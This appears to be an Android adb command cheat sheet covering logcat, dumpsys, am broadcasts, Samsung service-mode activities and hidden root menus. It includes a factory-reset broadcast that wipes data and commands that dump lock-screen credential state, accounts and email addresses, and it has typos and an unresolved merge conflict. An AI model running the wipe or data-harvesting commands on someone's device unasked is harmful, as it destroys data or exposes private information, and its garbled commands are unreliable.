adb logcat -v printable -v color
```

#### Use -v time for print timestamps, and threadtime for dates:

```bash
adb logcat -v time
```

```bash
adb logcat -v threadtime
```
#### For get Example Output colorized with logcat:

```bash
adb logcat -v color
```
#### Displays current log buffer sizes:

```bash
adb logcat -g   
```
#### Sets the buffer size (K or M):

```bash
adb logcat -G 16M   
```
#### Clear the log buffer:

```bash
adb logcat -c
```
#### Enables ALL log messages (verbose mode)

```bash
adb logcat *:V  
```
#### Dumps data to specified file

```bash
adb logcat -f <filename>   
```
#### Display PID with the log info 

```bash
adb logcat -v process
```
#### Display the raw log message, with no other metadata fields

```bash
adb logcat -v raw
```
#### Display the date, invocation time, priority/tag, and PID of the process issuing the message

```bash
adb logcat -v time
```
#### Display the priority, tag, and the PID and TID of the thread issuing the message

```bash
adb logcat -v thread
```
#### Display the date, invocation time, priority, tag, and the PID and TID of the thread issuing the message

```bash
adb logcat -v threadtime
```
#### Display all metadata fields and separate messages with blank lines

```bash
adb logcat -v long
```
#### Log multiple options (-b ... -b ....): 

```bash
adb logcat -b main -b radio -b events
```
#### Run all at once, no reason for use it like this really

```bash
adb logcat \
    -v brief \ 
    -v long \ 
    -v process \ 
    -v raw \ 
    -v tag \ 
    -v thread \
    -v threadtime \ 
    -v time \ 
    -v color       
```
#### Print logs from locks_ettings
```bash
adb logcat \
    |grep  "LockSettingsService\
    |LockPatternUtilsKeyStorage\
    |vold\
    |vold\
    |keystore2\
    |keymaster_tee\
    |LockSettingsService\
    |vold_prepare_subdirs"
```

## ADB Shell <small>dumpsys</small>

#### Screen State
```bash
screenState="$(adb shell dumpsys input_method \
   |grep -i "mSystemReady=true mInteractive=" \
   |awk -F= '{print $3}')"

if [[ $screenState = "true" ]]; then 
    echo "Screen is on"; 
else 
    echo "Screen is off"; 
fi
```

#### Get a nice output from dumpsys
```bash
adb shell dumpsys -l \
    |sed 's/^ /adb shell dumpsys/g;G'
```
#### Get a help cheatsheet fast
```bash
adb shell dumpsys -l\
    |sed 's/^ /adb shell dumpsys/g;s/$/ -h/g;G'
```
#### Execute all dumpsys help 
```bash
adb shell dumpsys appops  -h \
    |sed 's/--/adb shell --/g;s/    /### /g' \
```
#### Print this help text
```bash
adb shell dumpsys appops --op [OP]
```
#### Limit output to data associated with the given app op code
```bash
adb shell dumpsys appops--mode [MODE]
```
#### Limit output to data associated with the given app op mode
```bash
adb shell dumpsys appops--package [PACKAGE]
```
#### Limit output to data associated with the given package name
```bash
adb shell dumpsys appops--attributionTag [attributionTag]
```
#### Limit output to data associated with the given attribution tag
```bash
adb shell dumpsys appops--include-discrete [n]
```
#### Include discrete ops limited to n per dimension. Use zero for no limit
```bash
adb shell dumpsys appops--watchers
```
#### Only output the watcher sections
```bash
adb shell dumpsys appops--history
```
### Only output history

#### Dumpsys Security Stuff stuff
```bash
adb shell dumpsys android.system.keystore2.IKeystoreService/default 
adb shell dumpsys android.security.samsungattestation 
adb shell dumpsys android.security.metrics
adb shell dumpsys android.security.maintenance 
adb shell dumpsys android.security.legacykeystore
adb shell dumpsys android.security.identity 
adb shell dumpsys android.security.compat 
adb shell dumpsys android.security.authorization 
adb shell dumpsys android.security.apc 
```

#### Dumpsys powerstats info
```bash
adb shell dumpsys powerstats
```
#### Dumpsys power info
```bash
 adb shell dumpsys power
```
#### Dumpsys Permission Permissions
```bash
adb shell dumpsys permission
adb shell dumpsys permission_checker
adb shell dumpsys permissionmgr
```
#### Dumpsys password policyś
```bash
adb shell dumpsys password_policy
```

#### Dumpsys Device FeatureS/Perfomance/Tracker/Info etc
```bash
adb shell dumpsys phone
```
#### Grep temperatures
```bash
adb shell dumpsys thermalservice
```
#### Dumpsys usagestats for an app
```bash
 adb shell dumpsys usagestats com.bankid.bus
```
#### Dump current USB state or issue command:

#### Example USB type C port role switch:
```bash
dumpsys usb set-port-roles "default" source device
```

#### Example USB type C port simulation with full capabilities:
```bash
dumpsys usb add-port "matrix" dual
dumpsys usb connect-port "matrix" ufp? sink? device?
dumpsys usb ports
dumpsys usb disconnect-port "matrix"
dumpsys usb remove-port "matrix"
dumpsys usb reset
```
#### Example USB type C port where only power role can be changed:
```bash
dumpsys usb add-port "matrix" dual
dumpsys usb connect-port "matrDumpsysix" dfp source? host
dumpsys usb reset
```
#### Example USB OTG port where id pin determines function:
```bash
dumpsys usb add-port "matrix" dual
dumpsys usb connect-port "matrix" dfp source host
dumpsys usb reset
```
#### Example USB device-only port:
```bash
dumpsys usb add-port "matrix" ufp
dumpsys usb connect-port "matrix" ufp sink device
dumpsys usb reset
```

#### Example simulate contaminant status:
```bash
dumpsys usb add-port "matrix" ufp
dumpsys usb set-contaminant-status "matrix" true
dumpsys usb set-contaminant-status "matrix" false
```
#### Example USB device descriptors:
```bash
dumpsys usb dump-descriptors -dump-short
dumpsys usb dump-descriptors -dump-tree
dumpsys usb dump-descriptors -dump-list
dumpsys usb dump-descriptors -dump-ra
```
#### Dumpsys procstats
```bash
adb shell dumpsys procstats
```
#### Dumpsys procstats with full stats
```bash
adb shell dumpsys procstats --full-stats
```
#### Dumpsys procstats csv-mem normal
```bash
adb shell dumpsys procstats --csv-mem norm
```
#### Dumpsys Package
```bash
adb shell dumpsys package com.android.chrome
```
#### Print available activitys per package
```bash
adb shell dumpsys package \
    |grep -Eo "^[[:space:]]+[0-9a-f]+[[:space:]]+com.samsung.android.app.telephonyui.esimclient/[^[:space:]]+" \
    |grep -oE "[^[:space:]]+$"
com.samsung.android.app.telephonyui.esimclient/.OdaWebViewActivity
```

#### Print available receivers for an an default app

```bash
adb shell dumpsys package \
    |grep -Eo "^[[:space:]]+[0-9a-f]+[[:space:]]+com.samsung.android.app.telephonyui/[^[:space:]]+"
    |grep -oE "[^[:space:]]+Receiver"
```

```
com.samsung.android.app.telephonyui/com.android.voicemail.impl.sync.VoicemailProviderChangeReceiver
com.samsung.android.app.telephonyui/com.android.voicemail.impl.fetch.FetchVoicemailReceiver
com.samsung.android.app.telephonyui/com.android.voicemail.impl.sync.VoicemailProviderChangeReceiver
com.samsung.android.app.telephonyui/com.android.voicemail.impl.fetch.FetchVoicemailReceiver
com.samsung.android.app.telephonyui/.netsettings.ui.keystringreceiver.KeyStringReceiver
com.samsung.android.app.telephonyui/.netsettings.ui.keystringreceiver.KeyStringReceiver
com.samsung.android.app.telephonyui/.netsettings.ui.keystringreceiver.KeyStringReceiver
com.samsung.android.app.telephonyui/com.android.voicemail.impl.sync.VoicemailProviderChangeReceiver
com.samsung.android.app.telephonyui/com.android.voicemail.impl.fetch.FetchVoicemailReceiver
com.samsung.android.app.telephonyui/.callsettings.ui.spamprotection.WhoWhoServiceReceiver
com.samsung.android.app.telephonyui/.callsettings.ui.tty.TtyNotificationReceiver
com.samsung.android.app.telephonyui/.carrierui.networkui.app.NetworkUiReceiver
com.samsung.android.app.telephonyui/.carrierui.networkui.app.NetworkUiReceiver
com.samsung.android.app.telephonyui/.callsettings.ui.blocknumbers.BlockNumbersReceiver
```

#### Print available activitys for an an default app
```bash
adb shell dumpsys package     |grep -Eo "^[[:space:]]+[0-9a-f]+[[:space:]]+com.samsung.android.app.telephonyui/[^[:space:]]+"     |grep -oE "[^[:space:]]+.*Activity"
979e24b com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.CallBackgroundExternalActivity
979e24b com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.CallBackgroundExternalActivity
979e24b com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.CallBackgroundExternalActivity
979e24b com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.CallBackgroundExternalActivity
82531b8 com.samsung.android.app.telephonyui/.emergencydialer.view.EmergencyDialerActivity
82531b8 com.samsung.android.app.telephonyui/.emergencydialer.view.EmergencyDialerActivity
82531b8 com.samsung.android.app.telephonyui/.emergencydialer.view.EmergencyDialerActivity
5438970 com.samsung.android.app.telephonyui/.netsettings.ui.esim.QrTransferActivity
b46c261 com.samsung.android.app.telephonyui/.callsettings.ui.preference.CallSettingsActivity
4743337 com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.imagepreview.ImagePreviewPortActivity
82531b8 com.samsung.android.app.telephonyui/.emergencydialer.view.EmergencyDialerActivity
ee0c0be com.samsung.android.app.telephonyui/.netsettings.ui.NetSettingsActivity
6af1334 com.samsung.android.app.telephonyui/.carrierui.networkui.app.NoticeDataConnectionDialogActivity
b4d94cc com.samsung.android.app.telephonyui/.carrierui.iccnetwork.view.IccNetworkLockDialogActivity
6b62446 com.samsung.android.app.telephonyui/.carrierui.networkui.app.TmoDataRoamDialogActivity
3b405d1 com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.imagepreview.ImagePreviewActivity
14c5c99 com.samsung.android.app.telephonyui/.callsettings.ui.roamingautodial.RoamingAutoDialMainActiv
```

#### Print available services for an an default app
```bash
 adb shell dumpsys package \
    |grep -Eo "^[[:space:]]+[0-9a-f]+[[:space:]]+com.samsung.android.app.telephonyui/[^[:space:]]+" \
    |grep -oE "[^[:space:]]+.*Service"
```

```
76f5ff5 com.samsung.android.app.telephonyui/.callsettings.ui.spamprotection.WhoWhoService
76f5ff5 com.samsung.android.app.telephonyui/.callsettings.ui.spamprotection.WhoWhoService
76f5ff5 com.samsung.android.app.telephonyui/.callsettings.ui.spamprotection.WhoWhoService
1b863a1 com.samsung.android.app.telephonyui/.carrierui.tile.TurnOn5gTileService
766c1ab com.samsung.android.app.telephonyui/.carrierui.tile.VoLteTileService
61bfb8f com.samsung.android.app.telephonyui/.netsettings.ui.simcardmanager.service.SimCardManagerProcessService
9284a25 com.samsung.android.app.telephonyui/com.android.voicemail.impl.OmtpService
```

#### Print available activitys on device

```bash
dumpsys package \
    |grep -Eo "^[[:space:]]+[0-9a-f]+[[:space:]]+.*/[^[:space:]]+" 
    |grep -oE "[^[:space:]]+$"
```

#### Print current application in use (Android 12/13)   

```bash
dumpsys activity|grep -i mCurrentFocus|awk 'NR==1{print $3}'|cut -d'}' -f1
```
#### Dumpsys Activity Help
```bash
adb shell dumpsys perm
```
#### Dumpsys Activity Activities
```bash
adb shell dumpsys a
```
#### Dumpsys Activity Broadcasts
```bash
adb shell dumpsys activity broadcast
```
#### Dumpsys Broadcast Stats
```bash
adb shell dumpsys activity broadcast-stats
```
#### Dumpsys Pending Intent
```bash
adb shell dumpsys activity i
```
#### Dumpsys Activity Processes
```bash
adb shell dumpsys activity p
```
#### Dumpsys Activity Out Of Mem
```bash
adb shell dumpsys activity o
```
#### Dumpsys Activity Services
```bash
adb shell dumpsys activity services
```
#### Dumpsys Activity Asociations
```bash
adb shell dumpsys activity as
```
#### Dumpsys Activity LRU Services
```bash
adb shell dumpsys activity lru
```
#### Dumpsys Activity LRU Services
```bash
adb shell dumpsys activity lru
```
#### Dumpsys Activity binder-proxies stats on binder objects and IPCs
```bash
adb shell dumpsys activity binder-proxies
```
#### Dumpsys Activity settings currently applied config settings
```bash
adb shell dumpsys activity settings
```
#### Dumpsys Activity service client-side state
```bash
adb shell dumpsys activity service
```
#### Dumpsys Activity package [PACKAGE_NAME]: all state related to given package
```bash
adb shell dumpsys activity package
```
#### Dumpsys Activity all: dump all activities
```bash
adb shell dumpsys activity all
```
#### Dumpsys Activity top: dump the top activity
```bash
adb shell dumpsys activity top
```
#### Include all available server state
```bash
adb shell dumpsys activity -a
```
#### Dumpsys Activity and include client state
```bash
adb shell dumpsys activity -c
```
#### Dumpsys Activity all limit output to given package
```bash
adb shell dumpsys activity -p
```
#### Dumpsys Activity all output checkin format, `resetting data`
```bash
adb shell dumpsys activity --checkin
```
#### Dumpsys Activity output checkin format, not resetting data
```bash
adb shell dumpsys activity --C
```
#### Dumpsys All Activitys data
```bash
adb shell dumpsys activity --proto
```
#### Dumpsys Activity dump just the autofill-related state of an activity
```bash
adb shell dumpsys activity --autofill
```
#### Dumpsys Activity Help
```bash
adb shell dumpsys activity recents
```
#### Dumpsys Activity Exit Info
```bash
adb shell dumpsys activity exit-info
```
#### Dumpsys Activity LMK KILLS
```bash
adb shell dumpsys activity lmk
```
#### Dumpsys Activity Help
```bash
adb shell dumpsys activity recents
```
#### Dumpsys Activity Permissions
```bash
adb shell dumpsys activity top
```
#### Dumpsys Activity
```bash
adb shell dumpsys activity top
```
#### Dumpsys Activity Top
```bash
adb shell dumpsys activity top
```
#### List all active services:
```bash
adb shell dumpsys -l 
```

### List services on older devices via command below 

```sh
adb shell dumpsys -l |sed 's/^  /      /g'
```

```
Currently running services:
  AAS
  AODManagerService
  CCM
  CocktailBarService
  CodecSolution
  CustomFrequencyManagerService
  DeviceRootKeyService
  DirEncryptService
  DisplaySolution
  DockObserver
  EngineeringModeService
  HqmManagerService
  ImsBase
  OcfKeyService
  ReactiveService
  SEAMService
  SamsungKeyProvisioningManagerService
  SatsService
  SecExternalDisplayService
```
#### Dumpsys lock_settings 
```sh
adb shell dumpsys lock_settings
```
```
Current lock settings service state:

User State:
 User 0
 SP Handle: 5f0ef3437a85f55
Last changed: 2021-07-28 20:22:36 (b8212446331f2358)
  SID: 3fffcda35ee6c180
  Quality: 0
 CredentialType: Pin
 SeparateChallenge: true
 Metrics: known
  
Storage:
User 0 [/data/system_de/0/spblob]:
5 2021-07-28 20:22:36 05f0ef3437a85f55.weaver
   31 2021-07-28 20:22:36 05f0ef3437a85f55.pwd
   72 2021-07-28 20:22:36 05f0ef3437a85f55.metrics
  186 2021-07-28 20:22:36 05f0ef3437a85f55.spblob
   58 2021-07-28 20:22:36 0000000000000000.handle
  
StrongAuth:
PrimaryAuthFlags state:
 userId=0, primaryAuthFlags=0

 NonStrongBiometricAllowed state:

  
RebootEscrow:
mRebootEscrowWanted=false
mRebootEscrowReady=false
mRebootEscrowListener=com.android.server.recoverysystem.RecoverySystemService@bc1c4d8
mPendingRebootEscrowKey is not set
```

#### Print codecs for bluetooth headphones
```sh
adb shell dumpsys media.audio_flinger | grep -A3 Input 
```
#### Show bluetooth macaddr, bluetooth name and such things
```sh
adb shell dumpsys bluetooth_manager
```
#### Dump phone registry
```sh
adb shell dumpsys telephony.registry
```
#### Dump GPS Data:
```sh
adb shell dumpsys dumpsys location
```
#### Dump Settings

```sh
adb shell dumpsys settings
```
```
_id:225 name:lock_screen_show_notifications pkg:com.android.settings value:1 
_id:6 name:volume_bluetooth_sco pkg:android value:7 default:7
_id:192 name:ringtone_set pkg:com.google.android.gsf value:1
_id:159 name:lock_screen_allow_rotation pkg:android value:0
_id:2997 name:Flashlight_brightness_level pkg:com.android.systemui value:1001
_id:67 name:SEM_VIBRATION_NOTIFICATION_INTENSITY pkg:android value:5
_id:175 name:call_popup pkg:android value:0 default:0
_id:59 name:install_non_market_apps pkg:android value:1 default:1
```
#### Display Contacts On Sim Card
```bash
adb shell dumpsys simphonebook
```
#### Show hardware info as thermal stuff for cpu, gpu and battery
```sh
adb shell dumpsys hardware_properties
```
```
****** Dump of HardwarePropertiesManagerService ******
CPU temperatures: [38.0, 38.0]
CPU throttling temperatures: [55.0, 76.0]
CPU shutdown temperatures: [115.0, 115.0]
```

#### Print all applications that is using your email address
```sh
adb shell dumpsys account \
    |grep -i com.*$ -o\
    |cut -d' ' -f1\
    |cut -d} -f1|grep -v com$
```

```
com.microsoft.workaccount
com.skype.raider
com.samsung.android.mobileservice
com.facebook.messenger
com.google.android.gm.exchange
```

#### Show all notifications listener and so on:
```bash
adb shell dumpsys notification
```
#### Print all added email addresses from all applications
```bash
adb shell dumpsys \
    |egrep -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"
```    
#### Print version of a specifik package
```bash
adb shell dumpsys dumpsys package com.lge.signboard | grep versionName
    versionName=6.00.170603-0
```
#### Check state for screen and figoure how device was unlcked last time:
```sh
adb shelldumpsys  user
```
```
State: RUNNING_UNLOCKED
Last logged in fingerprint
agree Knox Privacy Policy: false
```

#### Simulate battery parameters Simulate battery parameters

Do you have any idea about how to discharge the AVD battery yet? 🔋 
Probably not if it is a virtual device with no real battery. 
But fortunately we can use the following command to simulate any scenario we want, 
like setting the level to 1% only

#### Simulate we got 1% Battery
```bash
adb shell dumpsys battery set level 1
```
#### Connect AC charger
```bash
adb shell dumpsys battery set ac 1
```
#### Disconnect AC charger
```bash
adb shell dumpsys battery set ac 0
```
#### Connect USB cable
```bash
adb shell dumpsys battery set usb 1
```
#### Disconnect USB cable
```bash
adb shell dumpsys battery set usb 0
```
#### After running each of those commands you can reset the battery options using:
```bash
adb shell dumpsys battery reset
```
#### And for example, you can dump data for all of the running services, dump all data for battery: 
```bash
adb shell dumpsys battery
```
#### Dump stats for your battery:
```bash
adb shell dumpsys atterystats 
```
#### Erase old stats for battery:
```bash
adb shell dumpsys batterystats --reset 
```
#### Sort Applications By Ram Usage:

```sh
adb shell dumpsys meminfo
```

```
Applications Memory Usage (in Kilobytes):
Uptime: 29602806 Realtime: 57806941

Total PSS by process:
265,435K: com.android.systemui (pid 4190)
264,671K: system (pid 3838)
171,192K: surfaceflinger (pid 3360)
152,523K: android.hardware.graphics.composer@2.1-service (pid 3338)
128,781K: com.sec.android.app.launcher (pid 5597 / activities)
92,656K: se.kronansapotek.kronan (pid 26729 / activities)
84,563K: logd (pid 3203)
80,944K: com.google.android.talk (pid 32314 / activities)
79,754K: com.google.android.googlequicksearchbox:search 
```

#### Unplug AC:
```bash
adb shell dumpsys battery unplug
```
#### Print how many notifications you have: 
```bash
adb shell dumpsys notification | grep NotificationRecord | wc -l 
```

## ADB Shell <small>dumpstate</small>

#### Dump info about your sim provider and kernel bootloader ID etc.

```sh
adb shell dumpstate -v
```

```
========================================================
== dumpstate: 2019-08-30 19:31:05
========================================================

Build: PPR1.180610.011.G950FXXS5DSF1
Build fingerprint: 'samsung/dreamltexx/dreamlte:9/PPR1.180610.011/G950FXXS5DSF1:user/release-keys'
Bootloader: G950FXXS5DSF1
Radio: G950FXXS5DSF1
Network: Comviq
Linux version 4.4.111-16019454 (dpi@21DHA724) (gcc version 4.9.x 20150123 (prerelease) 
(GCC) ) #1 SMP PREEMPT Mon Jun 3 20:16:50 KST 2019
Kernel: Command line: (unknown)
up 0 weeks, 0 days, 16 hours, 21 minutes
Uptime: Bugreport format version: 2.0
Dumpstate info: id=0 pid=26940 dry_run=0 args=dumpstate -v extra_options=
```
  
## ADB Shell <small>vr</small>

#### Set Persistent VR mode enabled/disabled
```bash
adb shell set-persistent-vr-mode-enabled `true|false`
```
#### Set Display Properties for VR
```bash
adb shell set-display-props `width` `height` `dpi`
```
#### Enable or Disable Virtual display for vr 
```bash
adb shell enable-virtual-display `true|false`
```
## ADB Shell <small>am</small>

### Launch Find my device settings
```bash
am start com.google.android.gms/.mdm.settings.FindMyDeviceSettingsActivity
```
### Launch nearby sharing settings
```bash
com.google.android.gms/.nearby.sharing.ReceiveSurfaceActivity
```
#### Launch Personal Google Setup (require root)
```bash
su -c am start com.google.android.gms/.accountsettings.mg.ui.main.MainActivity  
```
### Launch hidden settings for sms verification codes
```bash
su -c am start com.google.android.gms/.auth.api.phone.ui.AutofillSettingsCollapsingActivity
```
### Launch Sysdump Menu
```bash
am start com.sec.android.app.servicemodeapp/.SysDump
```
### Launch RAMDUMP settings

```bash
am start com.sec.android.app.servicemodeapp/.CPDebugLevel
```
### Launch RTN settings
```bash
am start com.sec.android.app.servicemodeapp/.RTN_View
```
###  Reset Total Call Time
```bash
am start com.sec.android.app.servicemodeapp/.ResetTotalCallTime
```
### Print total call time in its own window
```bash
am start com.sec.android.app.servicemodeapp/.TotalCallTime
```
### Print wifi info Activity
```bash
am start com.sec.android.app.servicemodeapp/.WifiInfoActivity
```
### Print Nand Unique Flash Number
```bash
am start com.sec.android.app.servicemodeapp/.NandFlashHeaderRead
```
### Open Phoneutil
```bash
am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil
```
### Launch UART USB MSM8960 Port
```bash
am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.SetPortUartUsbMSM8960
```
### Launch MDM 9x15 settings
```bash
am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_MDM9x15
```
### USB/UART Control
```bash
am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_ESC
```
### USB-C/UART Control
```bash
am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.SetPortUartUSBCTCModel

### Set Band Settings (Auto/SGLTE/CSFB)
```bash
am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_SGLTE
```
### Launch UART Test Mode
```bash
am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_TD
```
### USB/Uart (VIA/PDA)
```bash
am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_MarvellVIA
```
### USB Serioal Port Settings
```bash
am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_Bcom
```
### Show IMEI screen
```bash
am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.ShowIMEI
```
### Set USB Settings
```bash
am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.USBSettings
```
### Launch settings for auto answer without device
```bash
am start com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.AutoAnswer
```

#### Find all available modes we can launch in GUI
```bash
<<<<<<< HEAD
adb shell cmd package dump com.samsung.android.app.telephonyui \
    |grep "Activity filter" \
    |awk '{print $2}'\
    |awk '!seen[$0]++' 
=======
adb shell cmd package dump com.samsung.android.app.telephonyui\
      |grep "Activity filter"\
      |awk '{print $2}'\
      |awk '!seen[$0]++' 
>>>>>>> b05dc9657293b3058880093a448711ad129f7e53

com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.CallBackgroundExternalActivity
com.samsung.android.app.telephonyui/.emergencydialer.view.EmergencyDialerActivity
com.samsung.android.app.telephonyui/.netsettings.ui.esim.QrTransferActivity
com.samsung.android.app.telephonyui/.callsettings.ui.preference.CallSettingsActivity
com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.imagepreview.ImagePreviewPortActivity
com.samsung.android.app.telephonyui/.netsettings.ui.NetSettingsActivity
com.samsung.android.app.telephonyui/.carrierui.networkui.app.NoticeDataConnectionDialogActivity
com.samsung.android.app.telephonyui/.carrierui.iccnetwork.view.IccNetworkLockDialogActivity
com.samsung.android.app.telephonyui/.carrierui.networkui.app.TmoDataRoamDialogActivity
com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.imagepreview.ImagePreviewActivity
com.samsung.android.app.telephonyui/.callsettings.ui.roamingautodial.RoamingAutoDialMainActivity
com.samsung.android.app.telephonyui/.netsettings.ui.esim.ResetEsimActivity
com.samsung.android.app.telephonyui/.carrierui.networkui.app.AllowDataConnectionDialogActivity
com.samsung.android.app.telephonyui/.carrierui.networkui.app.AutoTimeSetDialogActivity
com.samsung.android.app.telephonyui/.callsettings.ui.callbarring.CbCdmaInputPasswordActivity
com.samsung.android.app.telephonyui/.callsettings.ui.tty.UseExternalTtyKeyboardActivity
com.samsung.android.app.telephonyui/.netsettings.ui.esim.LuiActivity
com.samsung.android.app.telephonyui/.callsettings.ui.quickdeclinemessages.QuickDeclineMessagesEditActivity
com.samsung.android.app.telephonyui/.netsettings.ui.simcardmanager.SimCardMgrActivity
com.samsung.android.app.telephonyui/.callsettings.ui.roamingautodial.RoamingAutoDialSettingsActivity
com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.videopreview.VideoPreviewPortActivity
com.samsung.android.app.telephonyui/.callsettings.ui.roamingautodial.RoamingAutoDialSubActivity
com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.CallBackgroundBaseActivity
com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.CallBackgroundBasePortActivity
com.samsung.android.app.telephonyui/.emergencydialer.view.EmergencyMedicalInfoActivity
com.samsung.android.app.telephonyui/.callsettings.ui.tty.TtyModeDialogActivity
com.samsung.android.app.telephonyui/.carrierui.photoring.ui.PhotoringScreenActivity
com.samsung.android.app.telephonyui/.carrierui.groupcall.view.GroupCallActivity
com.samsung.android.app.telephonyui/.callsettings.ui.spamprotection.SmartCallPrivacyNoticeActivity
com.samsung.android.app.telephonyui/.callsettings.ui.callbackground.videopreview.VideoPreviewActivity
com.samsung.android.app.telephonyui/.callsettings.ui.aboutphone.AboutPhoneBaseActivity
com.samsung.android.app.telephonyui/.callsettings.ui.callingaccounts.MakeCallsWithDialogActivity
com.samsung.android.app.telephonyui/.hiddennetworksetting.MainActivity
com.samsung.android.app.telephonyui/.callsettings.ui.phonenumberlocator.PhoneNumberLocatorLegalInfoActivity
```

#### Send simple notification
```bash
adb shell am broadcast \
    -n your.package.name/com.google.firebase.iid.FirebaseInstanceIdReceiver \
    -c your.package.name \
    -a com.google.android.c2dm.intent.RECEIVE
```

#### Send notification
```bash
adb shell am broadcast \
    -n com.android.google.youtube/com.google.firebase.iid.FirebaseInstanceIdReceiver \
    -a "com.google.android.c2dm.intent.RECEIVE" }-es "title" "Title" --es "body" "Body"
```

#### How to send push notification locally using ADB without need network connection.
```bash
adb shell am broadcast \
  -n com.your.app/com.google.firebase.iid.FirebaseInstanceIdReceiver \
  -a "com.google.android.c2dm.intent.RECEIVE" \
  --es "extra1" "65" \
  --es "guid" "1f400184-9215-479c-b19a-a9cd9a1d9dc9" \
  --es "extra3" "VALUE" \
  --es "extra4" "'Long string with spaces'"
```

#### How to use Demo Mode

#### First you enable the Demo Mode:
```bash
adb shell settings put global sysui_demo_allowed 1 
```
#### Display time 12:00
```bash
adb shell am broadcast -a com.android.systemui.demo \
    -e command clock -e hhmm 1200
```
#### Display full mobile data without type
```bash
adb shell am broadcast -a com.android.systemui.demo \
    -e command network -e mobile show -e level 4 -e datatype false
```
#### Hide notifications
```bash
adb shell am broadcast -a com.android.systemui.demo \
    -e command notifications -e visible false
```
#### Show full battery but not in charging state
```bash
adb shell am broadcast -a com.android.systemui.demo  \
    -e command battery -e plugged false -e level 100
```
#### Exit Demo Mode
```bash
adb shell am broadcast -a com.android.systemui.demo 
    -e command exit
```
***

#### Add a value to default shared preferences.
```bash
adb shell am broadcast \
    -a org.example.app.sp.PUT \
    --es key key_name \
    --es value "hello world!"'
```
#### Remove a value to default shared preferences.
```bash
adb shell am broadcast \
    -a org.example.app.sp.REMOVE \
    --es key key_name'
```
#### Clear all default shared preferences.
```bash
adb shell am broadcast \
    -a org.example.app.sp.CLEAR \
    --es key key_name'
```
#### It's also possible to specify shared preferences file.
```bash
adb shell am broadcast \
    -a org.example.app.sp.PUT \
    --es name Game \
    --es key level \
    --ei value 10'
```
#### Play a mp3 track on device
```sh
adb shell am start \
    -a android.intent.action.VIEW \
    -d file:////storage/9A8A-1069/wuseman/ringtones/<mp3_track>.mp3 
    -t audio/mp3    
```
#### Data types

```bash
adb shell am broadcast \
    -a org.example.app.sp.PUT \
    --es key string \
    --es value "hello world!"'
```
```bash
adb shell am broadcast \
    -a org.example.app.sp.PUT \
    --es key boolean \
    --ez value true'
```

```bash
adb shell am broadcast \
    -a org.example.app.sp.PUT \
    --es key float \
    --ef value 3.14159'
```

```bash
adb shell am broadcast \
    -a org.example.app.sp.PUT \
    --es key int \
    --ei value 2015'
```

```bash
adb shell am broadcast \
    -a org.example.app.sp.PUT \
    --es key long \
    --el value 9223372036854775807'
```

#### Restart application process after making changes

```bash
aam broadcast \
    -a org.example.app.sp.CLEAR \
    --ez restart true'
```

#### Open default Android Camera app and take a picture, works on mostly devices
```bash
am start com.sec.android.app.camera/.Camera
am start -a android.media.action.STILL_IMAGE_CAMERA_SECURE
```

#### Open Google Camera (Pixel 4)

```bash
adb shell am start com.google.android.GoogleCamera 
```
#### Set default preferences for an app:
```bash
adb shell am broadcast \
    -a org.example.app.sp.CLEAR \
    --es key key_name
```

#### WARNING!! This will Factory Resetet your device after next reoboot
```bash
adb shell am broadcast \
    -a android.intent.action.MASTER_CLEAR
    # reboot # < uncomment this for reboot your device, 
    # otherwise u will need to reboot manually later
    # and then it will do a factory reset, you have been warned!
```

#### Open Special Menu
```bash
adb shell am start \
    -a android.intent.action.VIEW \
```

#### Open settings:
```bash
 am start \
    -n com.android.settings/com.android.settings.Settings
```

#### Open activity to new APN
```bash
 am start -a android.intent.action.INSERT   \
    content://telephony/carriers  \
    --ei simId 
```

#### Open Hidden menu screen: select the entry and select "enable"
```bash
adb shell "su -c am broadcast \
    -a android.provider.Telephony.SECRET_CODE \
    -d android_secret_code://HIDDENMENUENABLE"
```
#### Open internal operation test menu which lets you look at all sorts of interesting and possibly dangerous goodies
```bash
adb shell "su -c am broadcast \
    -a android.provider.Telephony.SECRET_CODE 
    -d android_secret_code://IOTHIDDENMENU"
```
#### Opens a dialog box followed by another dialog asking for the unlock key code
```bash
adb shell "su -c am broadcast \
    -a android.provider.Telephony.SECRET_CODE \
    -d android_secret_code://UNLOCKKERNEL"
```
#### Start prefered webbrowser (remove # for wich you wanna use)
```bash
adb shell am start  \
    -a android.intent.action.VIEW  \
    -d <url> <add any of below here>
  # Default Browser:        com.android.browser 
  # Gogle Chrome Browser:   com.android.chrome 
  # Samsung Browser:        com.sec.android.sbrowser) 
```

#### Open Camera in Photo Mode
```bash
adb shell am start \
    -a android.media.action.IMAGE_CAPTURE
```
#### Open Camera in Photo mode and take a picture
```bash
adb shell am start -a android.media.action.IMAGE_CAPTURE
adb shell input keyevent 66
```    
#### Open Camera in Video mode
```bash
adb shell am start -a android.media.action.VIDEO_CAMERA
```

#### Open Camera in Video mode and start recording
```bash
adb shell am start -a android.media.action.VIDEO_CAMERA
input keyevent 66
```

#### Go to gallary and choose a picture and then set wallpaper:
```bash
adb shell am start -a android.intent.action.SET_WALLPAPER
```

#### Open any URL in default browser
```bash
